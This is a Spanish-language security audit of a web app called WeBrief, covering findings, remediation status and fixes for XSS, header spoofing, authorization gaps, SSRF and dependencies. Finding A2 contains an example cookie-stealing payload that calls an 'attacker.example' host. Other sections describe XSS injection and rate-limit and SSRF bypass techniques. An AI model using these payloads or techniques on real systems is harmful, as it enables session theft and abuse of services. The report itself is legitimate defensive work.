# WeBrief — Auditoría de seguridad 2026-08-17

Alcance: rama `main` (commit `9f3be10`, v2.15.2), Prod en `https://webrief.app`.
Método: 5 auditorías paralelas (XSS cliente, authz/IDOR backend, tokens/SSRF, dependencias, config/secretos/headers) + advisors de Supabase Prod + verificación de headers en vivo. Los 4 hallazgos ALTO/MEDIO principales fueron re-verificados manualmente leyendo el código.

## Estado de remediación (actualizado 2026-08-17)

**DEPLOYADO A PRODUCCIÓN el 2026-08-18** (merge `942b0e8`, v2.15.3). Verificado en vivo: sitio y API en 200, bundle servido coincide con el build del deploy, y el token por query string rechazado con 401 en `webrief.app`.

| ID | Hallazgo | Estado |
|---|---|---|
| A1 | XSS almacenado en share público | **Corregido** — saneo server-side al escribir + en salida pública + 6 sinks del cliente |
| A2 | CTA acepta `javascript:` | **Corregido** — allowlist en los 4 puntos del roundtrip |
| A3 | `X-Forwarded-For` falsificable | **Corregido** — helper único sobre `req.ip` |
| A4 | Sin CSP ni headers en el HTML | **Redactado, pendiente de aplicar** — requiere sudo del owner |
| M1 | Permisos de templates | **Corregido** — POST con rol de escritura, DELETE admin/manager |
| M2 | Upload de brief docs sin permiso | **Corregido** |
| M3 | JWT en query string | **Corregido** — descarga por blob; el backend ya no acepta token por query |
| M4 | `error.message` al cliente | **Corregido** — 149 sitios en 11 archivos |
| M5 | SSRF por DNS rebinding | **Corregido** — IP validada fijada en la conexión |
| M6 | `securityBlocks` falla abierto | **Corregido** — validación estricta; ya no cachea el fallo |
| B3 | Toggles de Auth en Supabase | **Parcial** — OTP ajustable; contraseñas filtradas requiere plan Pro |
| Deps | 14 altas, 0 críticas | **Corregido** — los 4 paquetes en 0 vulnerabilidades |

Pendientes deliberados, con su razón:
- **A4** necesita que el owner recargue Nginx (`deploy@VPS` no tiene sudo). Va en dos pasos: `Report-Only` primero, enforce después.
- **B3** (contraseñas filtradas) está bloqueado por el plan de Supabase. Alternativa gratuita: implementar el chequeo de HaveIBeenPwned por k-anonimato en el flujo de set-password, que es propio.
- **Sin backfill** del `content_html` ya almacenado: el saneo en lectura lo cubre, y mutar contenido real de clientes merece su propio paso revisado.
- **B1** (`brief_share_token` en plaintext) y **B2** (comparación no constant-time del secreto de cron) siguen abiertos por bajo impacto.
- El frontend no tiene runner de tests, así que `safeUrl.js` y el saneo del cliente se verificaron a mano con jsdom; el contrato sí está testeado del lado del servidor.

Verificación al cierre: backend 392/392, MCP 207/207, shared 23/23, build del frontend OK, y los 4 paquetes en 0 vulnerabilidades.

---

## Resumen ejecutivo (hallazgos originales)

| Severidad | Cantidad | Estado al momento de auditar |
|---|---|---|
| ALTA | 4 | Sin parchear en Prod |
| MEDIA | 6 | Sin parchear |
| BAJA | 3 | Sin parchear |
| Dependencias críticas | 0 | — |
| Dependencias ALTAS | 14 | Todas se arreglan sin breaking changes |

**El hallazgo central:** la sanitización de HTML que se escribió en junio de 2026 (`fix/security-s1-xss-sanitization`) **nunca se mergeó a `main`**. Lo que sí se mergeó (v2.15.1) fue la sanitización de **archivos SVG subidos** — que es un problema distinto y no protege el render de `content_html`. Hoy no existe ninguna dependencia de sanitización en `frontend/package.json` y no hay CSP en ninguna capa.

**Lo que está bien:** no hay secretos hardcodeados, CORS es allowlist cerrado, las 29 tablas tienen RLS habilitado (la anon key no lee nada), los tokens son de 256 bits y hasheados at rest, OAuth implementa PKCE S256 con rotación y detección de reuso, no hay mass assignment ni path traversal, y los endpoints bulk validan permisos por fila.

---

## ALTA

### A1 — XSS almacenado en la página pública de share
`frontend/src/pages/SharePage.jsx:485`

```jsx
<div className={styles.content} dangerouslySetInnerHTML={{ __html: page.contentHtml }} />
```

`page.contentHtml` llega crudo desde `GET /api/public/share/:token`. Lo único que se aplica es `stripCommentMarks()` (`backend/src/routes/public.js:78-86`), que es un regex para quitar `<span data-comment-id>` — **no es un sanitizador**. El path de escritura (`PUT /api/projects/:id/pages`, `routes/projects.js:920`) tampoco valida HTML.

**Explotación:** cualquier rol con escritura de contenido (`admin, manager, editor, content_writer, designer, developer`) o una cuenta comprometida guarda `<img onerror=...>` / `<script>` en una página. Se persiste intacto y ejecuta en el navegador de **cualquier visitante anónimo** que abra el link de share — que es la función central del producto. Sin CSP, el payload tiene acceso total al DOM, puede exfiltrar y puede llamar a los endpoints públicos de comentarios/aprobaciones como ese visitante.

> Nota importante: el editor TipTap **no** es una barrera de seguridad. El endpoint acepta `contentHtml` del body sin re-validar contra el schema, así que una llamada directa a la API con un bearer válido escribe HTML arbitrario que la UI nunca produciría.

**Sinks adicionales del mismo problema** (autenticados, menor radio de impacto):
- `frontend/src/pages/ProjectEditor.jsx:10994`, `:11003` — panel de propuestas: un `designer` (rol de menor confianza) inyecta hacia la sesión del admin/manager que revisa.
- `frontend/src/components/editor/ConflictCompareModal.jsx:47` — conflicto de colaboración, dispara en el navegador del co-editor.
- `frontend/src/pages/ProjectEditor.jsx:10719` (Handoff), `:11250` (Preview) — mayormente self-XSS.

**Fix:** re-portar la lógica de sanitización a `main` y aplicarla **server-side al escribir** (cubre todos los consumidores de una sola vez) con allowlist alineado al schema de TipTap, más sanitización en el render como defensa en profundidad. La rama original está muy stale (~39.800 líneas de diff contra `main`: es anterior a biblioteca/carpetas/onboarding/workspace-switcher), así que **no se puede mergear tal cual** — hay que re-portar el código, no hacer merge. Además la rama no cubría los sinks 4 y 5 (ConflictCompareModal / ProposalReviewPanel) ni A2.

### A2 — El nodo CTA acepta URLs `javascript:`
`frontend/src/pages/ProjectEditor.jsx:257-265` (render), `:7567-7580` y `:193-206` (entrada), `:245-248` (parseHTML)

```js
['a', { href: url }, text]   // url = ctaUrl crudo, sin validar esquema
```

La URL se toma de un `window.prompt()` sin validación y se re-hidrata desde `data-cta-url` en cada carga.

Esto es una reimplementación que **saltea la protección propia de TipTap**: el mark `Link` estándar sí es seguro — `isAllowedUri()` de `@tiptap/extension-link` tiene allowlist hardcodeado (`http, https, ftp, ftps, mailto, tel, callto, sms, cid, xmpp`) y rechaza `javascript:` tanto en `setLink` como al serializar. El nodo CTA no tiene nada de eso.

**Explotación:** un editor pone `javascript:fetch('//attacker.example/c?d='+document.cookie)` como URL de un CTA con texto atractivo ("Ver catálogo"), guarda, y se serializa dentro de `content_html` → llega al sink A1. Requiere un clic, pero el botón está diseñado para ser clickeado.

**Fix:** validar `ctaUrl` con el mismo allowlist de esquemas que usa TipTap, en insert/edit **y** en `renderHTML`.

### A3 — `X-Forwarded-For` falsificable: anula todos los rate limits y los bloqueos de IP
`backend/src/middleware/security.js:88-94` y duplicado en `backend/src/lib/securityAudit.js:8-14`

```js
function getClientIp(req) {
  const forwardedFor = req.headers['x-forwarded-for']
  if (typeof forwardedFor === 'string' && forwardedFor.trim()) {
    return forwardedFor.split(',')[0].trim()   // ← valor provisto por el cliente
  }
  return req.ip || req.socket?.remoteAddress || 'unknown-ip'
}
```

Nginx (`deploy/nginx/webrief.app.conf:15-16`) usa `$proxy_add_x_forwarded_for`, que **agrega** la IP real al final de lo que el cliente mandó, y además expone la no-falsificable `X-Real-IP` — que el backend nunca lee. Tomar `[0]` devuelve exactamente el valor del atacante.

Ese valor es `req.clientIp` (`security.js:44`) y alimenta: la clave de **todos** los rate limiters (`security.js:230` — invite-user, sensitive-action, password-reset, share-link, uploads, y todo `public.js`) y el lookup de bloqueos de IP (`enforceIpSecurityBlock`, `security.js:73`, más el chequeo dentro de `requireAuth`).

**Explotación:** mandar `X-Forwarded-For: <valor aleatorio>` distinto en cada request. Cada request cae en un bucket nuevo → el rate limiting progresivo queda anulado (spam de invitaciones, spam de reset de password, sondeo de tokens públicos de brief, mutaciones y uploads públicos). Un bloqueo de IP creado por un admin desde `/security` se evade igual de fácil. También envenena `security_events.ip_address`, degradando la forensia del dashboard.

**Fix trivial:** usar `req.ip` (ya está `app.set('trust proxy', 1)` en `index.js:37`, así que Express resuelve correctamente el hop confiable) o leer `X-Real-IP`. Unificar las dos copias del helper. Nota: `routes/users.js:1041` ya usa `req.ip` correctamente — el helper parece un descuido, no una decisión.

### A4 — Sin CSP, y la página HTML pública no manda ningún header de seguridad
Verificado en vivo contra Prod:

```
https://webrief.app/          → ningún header de seguridad
https://webrief.app/api/*     → X-Content-Type-Options, X-Frame-Options: DENY,
                                Referrer-Policy, Permissions-Policy, CORP
```

`securityHeaders` (`backend/src/middleware/security.js:49-61`) se aplica con `app.use()` en `index.js:40`, así que solo cubre lo que atiende Express. El HTML lo sirve Nginx como archivo estático (`try_files $uri $uri/ /index.html`) y `deploy/nginx/webrief.app.conf` no tiene ni un `add_header`. No existe CSP en ninguna de las tres ubicaciones posibles (middleware, nginx, meta tag en `index.html`).

Resultado: la página más expuesta de la app — la que contiene el sink de A1 — se sirve sin protección de clickjacking, sin HSTS y sin CSP, que es justamente el control compensatorio de A1 y A2.

**Fix:** agregar los `add_header` a nivel `server` en Nginx (para que cubran `/` además de `/api/`), incluyendo CSP (`script-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`). Requiere al owner: `deploy@VPS` no tiene sudo sin contraseña.

---

## MEDIA

### M1 — POST/DELETE de templates solo valida membresía, no rol de manager
`backend/src/routes/companies.js:820-828` y `:849-853` — ambos usan `canAccessCompany` en lugar de `canManageCompanyLifecycle`. Cualquier miembro, incluidos los roles de rango más bajo (`content_writer`/`designer`/`developer`), crea templates arbitrarios o borra los que armó un manager. Es el caso atípico del archivo: todo el resto de acciones de configuración de empresa (`:482`, `:542`, `:598`, `:668`) sí usa `canManageCompanyLifecycle`.

### M2 — Upload de documentos de brief sin chequeo de rol de escritura
`backend/src/routes/projects.js:2766-2770` — nunca llama a `canWriteProjectContent`. El endpoint hermano `POST /:id/assets` (`:2016-2024`) sí lo hace. Cualquier usuario con acceso al proyecto, incluido `platformRole: 'qa'` (que todos los demás helpers tratan como solo-lectura), sube archivos consumiendo el presupuesto de 500 MB del proyecto.

### M3 — JWT de sesión en query string, queda en logs
`frontend/src/lib/api.js:88-103` (`apiDownloadToFile`) pone el `access_token` vivo en la URL; el backend lo acepta explícitamente (`middleware/auth.js:55`). Nginx loguea el request line completo con query string (retención 30+ días) y `securityLogger.js:22-32` loguea `req.originalUrl` verbatim — la redacción solo limpia *claves de objeto*, no tokens embebidos en un string de URL. Call sites: `UserEditModal.jsx:38`, `AccountSettingsPage.jsx:35`, `ProjectEditor.jsx:403,10536`. El export bulk ya migró al patrón POST-form (`apiSubmitDownload`); estos quedaron atrás. CWE-598.

### M4 — `error.message` crudo devuelto al cliente en 11 de 15 route files
El handler centralizado (`middleware/security.js:400-447`) está bien diseñado, pero la mayoría de las rutas capturan el error de Supabase localmente y responden `error.message`. El peor caso está en un endpoint **público sin autenticación**:

```js
// backend/src/routes/public.js:547-549
error: `No se pudo subir: ${uploadError.message}. Verificar que el bucket "brief-documents" exista.`
```

También `public.js:212`, `projects.js:78` (agrega `.details` de PostgREST, que suele traer nombres de constraints/columnas), `companies.js:191,408,568`, `auth.js:93,119,147,183`. Efecto secundario: estos paths nunca llaman a `logApplicationError`, así que se pierde el `errorId` y el rastro de auditoría.

### M5 — SSRF: ventana TOCTOU de DNS rebinding
`mcp/webrief-server/src/lib/urlFetcher.js:71-93` valida con `dns.lookup()` contra un blocklist de IPs privadas, pero `:139-148` hace `fetch(parsed.toString())` sobre el **hostname**, no sobre la IP validada. Undici resuelve DNS de nuevo al conectar, sin `dispatcher`/`lookup` que fije la dirección ya verificada.

El guard existente es bueno: protocolo con allowlist (`http`/`https`), `redirect: 'error'`, y los trucos de ofuscación IPv4 (`2130706433`, `0x7f000001`, octal, `127.1`) ya quedan neutralizados por el parser WHATWG antes del chequeo. El hueco es específicamente la ventana de rebinding: DNS con TTL bajo que devuelve IP pública en la validación y `169.254.169.254`/`127.0.0.1` al conectar. Requiere un token MCP válido (auto-emitible desde Settings).

**Fix:** fijar la IP validada para la conexión (custom `lookup`/`dispatcher` en `fetch`) o usar un cliente SSRF-safe que valide en el evento `connect` del socket.

### M6 — `securityBlocks` falla abierto + `.or()` interpolado
`backend/src/lib/securityBlocks.js:99-100, 111-124`: input derivado del request entra por string-interpolation a `.or()`, y **cualquier** error de la query que no sea "tabla faltante" se traga y retorna `null` = "no bloqueado". Un control de seguridad que falla abierto en lugar de cerrado.

---

## BAJA

- **B1** — `brief_share_token` se guarda en plaintext (`routes/projects.js:795`) y se devuelve a cualquiera que pueda ver el proyecto (`:2634-2649`), mientras que los share links normales se hashean (`lib/projectAccess.js:39-45`). Inconsistencia de diseño de storage, no bypass activo.
- **B2** — Comparación no constant-time del secreto de cron (`middleware/auth.js:46-51`, `===`). Canal lateral de timing teórico; un solo endpoint de mantenimiento depende de eso.
- **B3** — Toggles de Auth en Supabase Prod (advisors, WARN): protección de contraseñas filtradas (HaveIBeenPwned) **desactivada**, y expiración de OTP/magic-link **mayor a 1 hora**. Son los controles del lado Supabase que compensan que login/reset van directo a Supabase sin pasar por Express.

## Confirmado: login y reset quedan fuera de los controles del backend

`frontend/src/auth/AuthContext.jsx:183` y `pages/Login.jsx:51` llaman `signInWithPassword` / `resetPasswordForEmail` directo contra Supabase Auth. Los bloqueos de IP/usuario de `security_blocks` **no tienen efecto** en esos dos flujos: un usuario o IP bloqueado desde `/security` puede seguir intentando login y reset. Solo aplica el rate limiting propio de Supabase. Esto hace que B3 no sea cosmético.

---

## Dependencias

Cero vulnerabilidades críticas. 14 ALTAS repartidas en los 4 paquetes, y **todas se resuelven con `npm audit fix` sin `--force` y sin bumps mayores**, verificado contra los rangos semver declarados.

| Paquete | Lockfile | Críticas | Altas | Medias | Bajas |
|---|---|---|---|---|---|
| `frontend/` | 2026-08-14 (3 días) | 0 | 6 | 0 | 1 |
| `backend/` | 2026-08-06 (11 días) | 0 | 3 | 3 | 0 |
| `mcp/webrief-server/` | 2026-05-18 (91 días) | 0 | 4 | 1 | 1 |
| `shared/` | 2026-05-18 (91 días) | 0 | 1 | 0 | 0 |

### Prioridad real (ponderada por exposición en esta arquitectura)

1. **`multer` 2.1.1 → 2.2.0** (backend, directo, path de request en producción) — DoS por nombres de campo profundamente anidados, disparable contra cualquier endpoint de upload. Arreglo de una línea.
2. **`express` 4.22.1 → 4.22.2** (backend) — arrastra la cadena `qs`/`body-parser`, DoS remotamente disparable.
3. **`@modelcontextprotocol/sdk` 1.29.0 → 1.30.0** (mcp) — un solo bump menor arregla casi todo el cluster: `fast-uri` y `ip-address` (clase SSRF/host-confusion) y `hono` (CORS que refleja cualquier Origin con credentials).
4. **`react-router-dom` 7.13.1 → 7.18.2** (frontend) — 6 advisories. Varias apuntan a RSC/SSR/single-fetch y probablemente no son alcanzables en una SPA con Vite sin SSR, pero el bump es gratis.
5. `vite` 6.4.2 → 6.4.3 — el CVE es solo Windows + dev server; exposición nula en un build estático.
6. `ws` → ≥8.21.0 (los 4 paquetes) — WeBrief solo actúa como *cliente* `ws` contra Supabase; en mcp/shared llega vía `happy-dom` (tooling de test). La menos urgente de las ALTAS pese a la etiqueta.

Además: `nanoid` → ≥3.3.18, `postcss` → ≥8.5.23, `brace-expansion` → ≥2.1.4.

### Stale pero sin CVE (agendar aparte)

`express` 4→5, `react`/`react-dom` 18→19, `vite` 6→8 (hacer 6→7→8), `@vitejs/plugin-react` 4→6, `zod` 3→4 (mcp, rompe la validación de schemas de tools), `@supabase/supabase-js` 2.103→2.112, `@tiptap/*` → 3.30.1, `@imagekit/nodejs` 7.5→7.11, `archiver` 7→8.

**`jsdom` 29 → 30 (backend)**: sin CVE activo, pero es el motor DOM detrás de la sanitización server-side de DOMPurify — conviene incluirlo cuando se toque el pipeline de sanitización.

Notas: `frontend` y `backend` no declaran `engines`; `mcp` y `shared` piden `>=20`. No hay `.nvmrc`. `dompurify` 3.4.13 en backend está al día. No existen `helmet`, `jsonwebtoken`, `node-fetch` ni `sharp` en el árbol.

---

## Verificado como correcto

- **Base de datos (advisors de Supabase Prod):** las 29 tablas `public` tienen RLS habilitado, incluidas las sensibles nuevas (`mcp_tokens`, `oauth_access_tokens`, `oauth_clients`). Aunque la anon key vive en el frontend, no lee ninguna tabla. Sin tablas con RLS apagado, sin vistas `security definer` filtrando datos. Esto cierra la preocupación de "exposición vía PostgREST" del audit de junio.
- **Secretos:** ninguno hardcodeado en fuente trackeada. Solo lecturas de `process.env`. El frontend usa `VITE_SUPABASE_ANON_KEY`, no service-role.
- **CORS:** allowlist cerrado con `Set` y `.has(origin)` exacto (`middleware/security.js:19-37`). Sin wildcard, sin regex, sin reflejo del header `Origin`. `credentials: true` va apareado con allowlist cerrado, no con `*`.
- **Tokens:** share y MCP de 256 bits; MCP y OAuth hasheados at rest (solo se devuelve el valor crudo una vez); OAuth con PKCE S256 obligatorio (`plain` rechazado), binding de audiencia (RFC 8707), rotación de refresh con detección de reuso que revoca la familia entera, y redirect URIs con allowlist estricto.
- **Authz:** `getProjectById` es el chokepoint único y consistente. Lógica de roles centralizada en librerías puras sobre una tabla de rangos canónica (`shared/userRoles.js`), bloqueando acciones entre pares del mismo rango y el lockout del último admin. `move-company` valida la empresa **destino** antes del loop y la **origen** por fila. Los endpoints bulk validan por fila y devuelven 207. Biblioteca y carpetas scopean toda mutación a `companyId`.
- **Sin mass assignment:** cero hits de `...req.body` en `.update()`/`.insert()`; todos los handlers arman objetos con whitelist campo por campo.
- **Sin path traversal:** `sanitizeFileName` pasa por `path.basename()` + whitelist de caracteres; los paths de ImageKit siempre se construyen server-side.
- **Endpoints públicos:** los 6 validan el token antes de consultar datos; respuestas con whitelist manual de campos; caps (50 páginas, 80 preguntas); headers `no-store`/`noindex`.
- **MCP:** no toca Supabase directamente; cada tool es un cliente HTTP contra las rutas ya auditadas usando el token del propio usuario vía `AsyncLocalStorage`. Hereda la authz, no la evade.
- **Sin source maps** en producción (`vite.config.js` no override `build.sourcemap`).
- **Links normales de TipTap:** protegidos por el allowlist propio de la librería (verificado en el código instalado).
- **Briefs públicos:** las respuestas se renderizan como texto plano vía JSX; ningún path las convierte en HTML crudo hacia un sink. No explotable para XSS hoy.

---

## Plan de remediación sugerido

Estimaciones en tiempo de ejecución de agente.

**Tanda 1 — rápido y de alto impacto (~15 min total)**
1. A3: unificar `getClientIp` usando `req.ip` (~3 min). Restaura todo el rate limiting y los bloqueos de IP.
2. Dependencias: `npm audit fix` en los 4 paquetes + bump del SDK de MCP (~5 min + verificación de suite).
3. M1 + M2: agregar los dos chequeos de permisos faltantes (~5 min).
4. B3: activar los dos toggles de Auth en el dashboard de Supabase (~2 min, lo hace el owner).

**Tanda 2 — el trabajo real de XSS (~35 min)**
5. A1: re-portar sanitización server-side al escribir + en el render de los 5 sinks (~25 min).
6. A2: allowlist de esquemas para `ctaUrl` (~5 min).
7. A4: CSP + headers en Nginx (~5 min de agente; el reload lo hace el owner por sudo).

**Tanda 3 — endurecimiento (~30 min)**
8. M4: dejar de devolver `error.message`, empezando por `public.js` (~15 min).
9. M3: migrar `apiDownloadToFile` al patrón POST-form (~10 min).
10. M5 + M6: fijar IP en el fetcher SSRF; hacer que `securityBlocks` falle cerrado (~10 min).

Nota de versionado: este documento no cambia código, así que no corresponde bump. Cada tanda que se deployee sí necesita el suyo (Tanda 1 y 3 → `patch`; Tanda 2 → `patch`, o `minor` si el CSP rompe algún embed).
